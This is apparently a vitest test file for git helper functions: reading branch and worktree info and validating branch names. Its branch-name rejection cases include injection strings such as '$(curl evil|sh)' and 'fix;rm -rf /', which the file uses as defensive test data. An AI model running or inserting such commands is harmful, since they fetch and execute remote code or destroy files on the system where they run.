import { describe, expect, test } from 'vitest'
import { FsReader, findWorktreeForBranch, isValidBranchName, readGitInfo } from './dotgit'

function fakeFs(files: Record<string, string>, dirs: Record<string, string[]> = {}): FsReader {
  return {
    readFile: async (p) => files[p] ?? null,
    readDir: async (p) => dirs[p] ?? [],
  }
}

describe('readGitInfo', () => {
  test('normal repo on a branch', async () => {
    const fs = fakeFs({ '/repo/.git/HEAD': 'ref: refs/heads/main\n' })
    expect(await readGitInfo('/repo', fs)).toEqual({
      branch: 'main', isWorktree: false, gitDir: '/repo/.git', commonDir: '/repo/.git',
    })
  })
  test('linked worktree', async () => {
    const fs = fakeFs({
      '/wt/fix-auth/.git': 'gitdir: /repo/.git/worktrees/fix-auth\n',
      '/repo/.git/worktrees/fix-auth/HEAD': 'ref: refs/heads/fix-auth\n',
      '/repo/.git/worktrees/fix-auth/commondir': '../..\n',
    })
    expect(await readGitInfo('/wt/fix-auth', fs)).toEqual({
      branch: 'fix-auth', isWorktree: true,
      gitDir: '/repo/.git/worktrees/fix-auth', commonDir: '/repo/.git',
    })
  })
  test('detached head → branch null', async () => {
    const fs = fakeFs({ '/repo/.git/HEAD': 'deadbeefcafe\n' })
    expect((await readGitInfo('/repo', fs)).branch).toBeNull()
  })
  test('not a repo', async () => {
    expect(await readGitInfo('/plain', fakeFs({}))).toEqual({
      branch: null, isWorktree: false, gitDir: null, commonDir: null,
    })
  })
})

describe('findWorktreeForBranch', () => {
  const fs = fakeFs(
    {
      '/repo/.git/HEAD': 'ref: refs/heads/main\n',
      '/repo/.git/worktrees/fix-auth/HEAD': 'ref: refs/heads/fix-auth\n',
      '/repo/.git/worktrees/fix-auth/gitdir': '/wt/fix-auth/.git\n',
      '/repo/.git/worktrees/exp/HEAD': 'deadbeef\n',
      '/repo/.git/worktrees/exp/gitdir': '/wt/exp/.git\n',
    },
    { '/repo/.git/worktrees': ['fix-auth', 'exp'] },
  )
  test('finds linked worktree by branch', async () => {
    expect(await findWorktreeForBranch('/repo/.git', 'fix-auth', fs)).toBe('/wt/fix-auth')
  })
  test('finds main worktree by branch', async () => {
    expect(await findWorktreeForBranch('/repo/.git', 'main', fs)).toBe('/repo')
  })
  test('no worktree has the branch', async () => {
    expect(await findWorktreeForBranch('/repo/.git', 'nope', fs)).toBeNull()
  })
})

describe('isValidBranchName', () => {
  test.each(['main', 'fix-auth', 'feat/v1', 'release-1.2'])('accepts %s', (name) => {
    expect(isValidBranchName(name)).toBe(true)
  })

  test.each([
    ['command substitution', '$(curl evil|sh)'],
    ['backtick payload', '`curl evil|sh`'],
    ['contains space', 'fix auth'],
    ['contains double quote', 'fix"auth'],
    ['contains single quote', "fix'auth"],
    ['contains semicolon', 'fix;rm -rf /'],
    ['contains ampersand', 'fix&&rm -rf /'],
    ['contains newline', 'fix\nauth'],
    ['starts with dash', '-startdash'],
    ['starts with slash', '/main'],
    ['starts with dot', '.main'],
    ['ends with slash', 'main/'],
    ['ends with dot', 'main.'],
    ['ends with .lock', 'x.lock'],
    ['contains double dot', 'a..b'],
    ['contains double slash', 'a//b'],
    ['empty string', ''],
  ])('rejects %s (%j)', (_desc, name) => {
    expect(isValidBranchName(name)).toBe(false)
  })
})
